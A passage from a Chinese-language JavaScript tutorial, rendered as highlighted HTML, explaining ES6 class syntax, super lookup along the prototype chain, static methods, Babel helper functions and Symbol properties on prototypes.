<span class="hljs-title function_">method</span>(<span class="hljs-params"></span>) &#123;&#125;<br>&#125;<br><br><span class="hljs-comment">// 等价于</span><br><span class="hljs-title class_">Foo</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">method</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;&#125;;<br></code></pre></td></tr></table></figure><p>（3）静态成员实现</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Foo</span> &#123;<br>  <span class="hljs-keyword">static</span> <span class="hljs-title function_">staticMethod</span>(<span class="hljs-params"></span>) &#123;&#125;<br>&#125;<br><br><span class="hljs-comment">// 等价于</span><br><span class="hljs-title class_">Foo</span>.<span class="hljs-property">staticMethod</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;&#125;;<br></code></pre></td></tr></table></figure><p>（4）继承机制原理</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Child</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Parent</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">super</span>();<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// 近似等价于</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Child</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-title class_">Parent</span>.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>);<br>&#125;<br><br><span class="hljs-title class_">Child</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-title class_">Parent</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);<br><span class="hljs-title class_">Child</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">constructor</span> = <span class="hljs-title class_">Child</span>;<br></code></pre></td></tr></table></figure><p><strong>本质特性</strong></p><ul><li>原型继承的语法糖：没有引入新继承模型</li><li>更严格的语法：强制使用 new，默认严格模式</li><li>更清晰的封装：明确区分构造函数、方法和静态成员</li><li>更好的可读性：类似传统OOP语言的语法结构</li><li>不可枚举的方法：避免 for-in 循环污染</li></ul><h2 id="9-2-super-关键字的原型链逻辑"><a href="#9-2-super-关键字的原型链逻辑" class="headerlink" title="9.2 super 关键字的原型链逻辑"></a>9.2 <code>super</code> 关键字的原型链逻辑</h2><p>super 是 ES6 class 中用于访问父类内容的关键字</p><p><strong>两种调用方式</strong></p><p>（1）作为函数调用（仅在构造函数中）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Parent</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Child</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Parent</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name, age</span>) &#123;<br>    <span class="hljs-variable language_">super</span>(name); <span class="hljs-comment">// 调用父类构造函数</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>原型链逻辑如下：</p><ol><li>创建 Child 实例时，先调用 super() 相当于 Parent.call(this)</li><li>确保 this 先被父类初始化</li><li>建立正确的原型链关系：<code>ChildInstance.__proto__</code> → <code>Child.prototype.__proto__</code> → <code>Parent.prototype</code></li></ol><p>（2）作为对象引用（在方法中）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Parent</span> &#123;<br>  <span class="hljs-title function_">sayHello</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Hello from Parent&#x27;</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Child</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Parent</span> &#123;<br>  <span class="hljs-title function_">sayHello</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">super</span>.<span class="hljs-title function_">sayHello</span>() + <span class="hljs-string">&#x27; and Child&#x27;</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>原型链逻辑如下：</p><ol><li>super 指向父类原型：super &#x3D; Object.getPrototypeOf(Child.prototype)</li><li>方法调用时 this 仍指向当前实例</li><li>相当于 Parent.prototype.sayHello.call(this)</li></ol><p><strong>原型链查找机制</strong></p><p>（1）方法中的 super 查找路径</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span> &#123; <span class="hljs-title function_">method</span>(<span class="hljs-params"></span>) &#123;&#125; &#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">B</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">A</span> &#123; <span class="hljs-title function_">method</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-variable language_">super</span>.<span class="hljs-title function_">method</span>(); &#125; &#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">C</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">B</span> &#123; <span class="hljs-title function_">method</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-variable language_">super</span>.<span class="hljs-title function_">method</span>(); &#125; &#125;<br><br><span class="hljs-keyword">const</span> c = <span class="hljs-keyword">new</span> <span class="hljs-title function_">C</span>();<br>c.<span class="hljs-title function_">method</span>();<br></code></pre></td></tr></table></figure><p>其查找过程如下：</p><ol><li>C.prototype.method 中的 super → B.prototype</li><li>B.prototype.method 中的 super → A.prototype</li><li>最终调用 A.prototype.method</li></ol><p>（2）静态方法中的 super</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Parent</span> &#123;<br>  <span class="hljs-keyword">static</span> <span class="hljs-title function_">staticMethod</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Parent static&#x27;</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Child</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Parent</span> &#123;<br>  <span class="hljs-keyword">static</span> <span class="hljs-title function_">staticMethod</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">super</span>.<span class="hljs-title function_">staticMethod</span>() + <span class="hljs-string">&#x27; + Child static&#x27;</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>其查找逻辑：</p><ol><li>super 指向父类本身：super &#x3D; Object.getPrototypeOf(Child)</li><li>相当于 Parent.staticMethod.call(this)</li></ol><p><strong>底层实现原理</strong></p><p>（1）Babel 转译后的代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Child</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Parent</span> &#123;<br>  <span class="hljs-title function_">method</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">super</span>.<span class="hljs-title function_">parentMethod</span>();<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// 转译为</span><br><span class="hljs-keyword">var</span> <span class="hljs-title class_">Child</span> = (<span class="hljs-keyword">function</span>(<span class="hljs-params">_Parent</span>) &#123;<br>  <span class="hljs-title function_">_inherits</span>(<span class="hljs-title class_">Child</span>, _Parent);<br>  <br>  <span class="hljs-keyword">function</span> <span class="hljs-title function_">Child</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-title function_">_classCallCheck</span>(<span class="hljs-variable language_">this</span>, <span class="hljs-title class_">Child</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">_possibleConstructorReturn</span>(<span class="hljs-variable language_">this</span>, <span class="hljs-title function_">_getPrototypeOf</span>(<span class="hljs-title class_">Child</span>).<span class="hljs-title function_">apply</span>(<span class="hljs-variable language_">this</span>, <span class="hljs-variable language_">arguments</span>));<br>  &#125;<br><br>  <span class="hljs-title function_">_createClass</span>(<span class="hljs-title class_">Child</span>, [&#123;<br>    <span class="hljs-attr">key</span>: <span class="hljs-string">&quot;method&quot;</span>,<br>    <span class="hljs-attr">value</span>: <span class="hljs-keyword">function</span> <span class="hljs-title function_">method</span>(<span class="hljs-params"></span>) &#123;<br>      <span class="hljs-title function_">_get</span>(<span class="hljs-title function_">_getPrototypeOf</span>(<span class="hljs-title class_">Child</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>), <span class="hljs-string">&quot;parentMethod&quot;</span>, <span class="hljs-variable language_">this</span>).<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>);<br>    &#125;<br>  &#125;]);<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-title class_">Child</span>;<br>&#125;)(<span class="hljs-title class_">Parent</span>);<br></code></pre></td></tr></table></figure><p>（2）关键帮助函数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">_getPrototypeOf</span>(<span class="hljs-params">o</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getPrototypeOf</span>(o);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">_get</span>(<span class="hljs-params">target, property, receiver</span>) &#123;<br>  <span class="hljs-comment">// 模拟 super 属性查找</span><br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> <span class="hljs-title class_">Reflect</span> !== <span class="hljs-string">&quot;undefined&quot;</span> &amp;&amp; <span class="hljs-title class_">Reflect</span>.<span class="hljs-property">get</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">get</span>(target, property, receiver || <span class="hljs-variable language_">this</span>);<br>  &#125;<br>  <span class="hljs-keyword">var</span> base = <span class="hljs-title function_">_getPrototypeOf</span>(target);<br>  <span class="hljs-keyword">if</span> (!base) <span class="hljs-keyword">return</span>;<br>  <span class="hljs-keyword">var</span> desc = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getOwnPropertyDescriptor</span>(base, property);<br>  <span class="hljs-keyword">if</span> (desc.<span class="hljs-property">get</span>) &#123;<br>    <span class="hljs-keyword">return</span> desc.<span class="hljs-property">get</span>.<span class="hljs-title function_">call</span>(receiver || <span class="hljs-variable language_">this</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> base[property];<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="9-3-静态方法与原型的关系"><a href="#9-3-静态方法与原型的关系" class="headerlink" title="9.3 静态方法与原型的关系"></a>9.3 静态方法与原型的关系</h2><p>静态方法是 JavaScript 类中直接绑定到构造函数本身而非原型上的方法</p><p><strong>核心概念对比</strong></p><table><thead><tr><th align="left">特性</th><th align="left">静态方法</th><th align="left">原型方法</th></tr></thead><tbody><tr><td align="left">存储位置</td><td align="left">构造函数本身</td><td align="left">构造函数的 prototype 对象</td></tr><tr><td align="left">调用方式</td><td align="left">通过类名调用（ClassName.method()）</td><td align="left">通过实例调用（instance.method()）</td></tr><tr><td align="left">this 指向</td><td align="left">类构造函数</td><td align="left">实例对象</td></tr><tr><td align="left">继承行为</td><td align="left">可被子类继承</td><td align="left">实例可访问</td></tr><tr><td align="left">使用场景</td><td align="left">工具方法&#x2F;工厂方法</td><td align="left">实例相关操作</td></tr></tbody></table><p><strong>内存结构与原型链分析</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyClass</span> &#123;<br>  <span class="hljs-keyword">static</span> <span class="hljs-title function_">staticMethod</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Static&#x27;</span>);<br>  &#125;<br>  <br>  <span class="hljs-title function_">prototypeMethod</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Prototype&#x27;</span>);<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// 内存结构等价于：</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">MyClass</span>(<span class="hljs-params"></span>) &#123;&#125;<br><br><span class="hljs-comment">// 静态方法（直接挂载构造函数）</span><br><span class="hljs-title class_">MyClass</span>.<span class="hljs-property">staticMethod</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Static&#x27;</span>);<br>&#125;;<br><br><span class="hljs-comment">// 原型方法</span><br><span class="hljs-title class_">MyClass</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">prototypeMethod</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Prototype&#x27;</span>);<br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>底层实现（Babel 转译）</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 静态方法继承的实现</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">_inherits</span>(<span class="hljs-params">subClass, superClass</span>) &#123;<br>  <span class="hljs-comment">// 设置原型继承</span><br>  subClass.<span class="hljs-property">__proto__</span> = superClass;<br>  <br>  <span class="hljs-comment">// 复制静态方法</span><br>  <span class="hljs-keyword">if</span> (superClass) &#123;<br>    <span class="hljs-title class_">Object</span>.<span class="hljs-property">setPrototypeOf</span> <br>      ? <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">setPrototypeOf</span>(subClass, superClass)<br>      : subClass.<span class="hljs-property">__proto__</span> = superClass;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="9-4-符号属性（Symbol）对原型的影响"><a href="#9-4-符号属性（Symbol）对原型的影响" class="headerlink" title="9.4 符号属性（Symbol）对原型的影响"></a>9.4 符号属性（Symbol）对原型的影响</h2><p><strong>Symbol 在原型系统中的行为</strong></p><p>（1）原型上的 Symbol 属性</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> customMethod = <span class="hljs-title class_">Symbol</span>(<span class="hljs-string">&#x27;custom&#x27;</span>);<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyClass</span> &#123;<br>  [customMethod]() &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Symbol method called&#x27;</span>);<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">const</span> instance = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyClass</span>();<br>instance[customMethod](); <span class="hljs-comment">// &quot;Symbol method called&quot;</span><br><br><span class="hljs-comment">// 检查原型链</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(customMethod <span class="hljs-keyword">in</span> <span class="hljs-title class_">MyClass</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>); <span class="hljs-comment">// true</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(instance.<span class="hljs-title function_">hasOwnProperty</span>(customMethod)); <span class="hljs-comment">// false</span><br></code></pre></td></tr></table></figure><p>（2）内置 Symbol 与原型</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">CustomIterable</span> &#123;<br>  *[<span class="hljs-title class_">Symbol</span>.<span class="hljs-property">iterator</span>]() &#123;<br>    <span class="hljs-keyword">yield</span> <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">yield</span> <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">yield</span> <span class="hljs-number">3</span>;<br>  &#125;<br>&#125;<br><br>[...<span class="hljs-keyword">new</span> <span class="hljs-title class_">CustomIterable</span>()]; <span class="hljs-comment">// [1, 2, 3]</span><br></code></pre></td></tr></table></figure><p><strong>Symbol 对原型系统的特殊影响</strong></p><p>（1）避免属性名冲突</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 不同库安全扩展原型</span><br><span class="hljs-keyword">const</span> lib1Method = <span class="hljs-title class_">Symbol</span>(<span class="hljs-string">&#x27;lib1&#x27;</span>);<br><span class="hljs-keyword">const</span> lib2Method = <span class="hljs-title class_">Symbol</span>(<span class="hljs-string">&#x27;lib2&#x27;</span>);<br><br><span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>[lib1Method] = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-comment">/* Lib1实现 */</span> &#125;;<br><span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>[lib2Method] = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-comment">/* Lib2实现 */</span> &#125;;<br><br><span class="hljs-comment">// 互不干扰</span><br>[][lib1Method]();<br>[][lib2Method]();<br></code></pre></td></tr></table></figure><p>（2）隐藏原型方法</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> internalLogic = <span class="hljs-title class_">Symbol</span>(<span class="hljs-string">&#x27;internal&#x27;</span>);<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">SecureAPI</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">publicData</span> = <span class="hljs-string">&#x27;safe&#x27;</span>;<br>  &#125;<br>  <br>  [internalLogic]() &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;内部处理逻辑&#x27;</span>);<br>  &#125;<br>  <br>  <span class="hljs-title function_">publicMethod</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">this</span>[internalLogic]();<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">publicData</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">const</span> api = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecureAPI</span>();<br>api.<span class="hljs-title function_">publicMethod</span>(); <span class="hljs-comment">// 正常工作</span><br>api[internalLogic](); <span class="hljs-comment">// 报错：除非能获取Symbol引用</span><br></code></pre></td></tr></table></figure><p>（3）不可枚举性对原型遍历的影响</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>[<span class="hljs-title class_">Symbol</span>(<span class="hljs-string">&#x27;test&#x27;</span>)] = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;&#125;;<br><br><span class="hljs-comment">// 不影响常规遍历</span><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> key <span class="hljs-keyword">in</span> []) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(key); <span class="hljs-comment">// 无输出（无枚举属性）</span><br>&#125;<br><br><span class="hljs-comment">// 也不影响Object.keys</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(<span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>)); <span class="hljs-comment">// 不包含Symbol属性</span><br></code></pre></td></tr></table></figure><p><strong>内置 Symbol 与原型行为定制</strong></p><p>（1）Symbol.hasInstance</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MySpecialArray</span> &#123;<br>  <span class="hljs-keyword">static</span> [<span class="hljs-title class_">Symbol</span>.<span class="hljs-property">hasInstance</span>](instance) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(instance);<br>  &#125;<br>&#125;<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>([] <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">MySpecialArray</span>); <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure><p>（2）Symbol.species</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyArray</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Array</span> &#123;<br>  <span class="hljs-keyword">static</span> get [<span class="hljs-title class_">Symbol</span>.<span class="hljs-property">species</span>]() &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Array</span>; <span class="hljs-comment">// 控制衍生对象的构造函数</span><br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">const</span> myArr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyArray</span>(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>);<br><span class="hljs-keyword">const</span> mapped = myArr.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">x</span> =&gt;</span> x*<span class="hljs-number">2</span>);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(mapped <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">MyArray</span>); <span class="hljs-comment">// false</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(mapped <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Array</span>); <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure><p>（3）Symbol.toStringTag</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyCollection</span> &#123;<br>  get [<span class="hljs-title class_">Symbol</span>.<span class="hljs-property">toStringTag</span>]() &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;MyCollection&#x27;</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MyCollection</span>().<span class="hljs-title function_">toString</span>()); <br><span class="hljs-comment">// &quot;[object MyCollection]&quot;</span><br></code></pre></td></tr></table></figure><p><strong>Symbol 属性的继承</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> parentSymbol = <span class="hljs-title class_">Symbol</span>(<span class="hljs-string">&#x27;parent&#x27;</span>);<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Parent</span> &#123;<br>  [parentSymbol]() &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Parent symbol method&#x27;</span>);<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Child</span> <span class="hljs-keyword">extends</span> <span 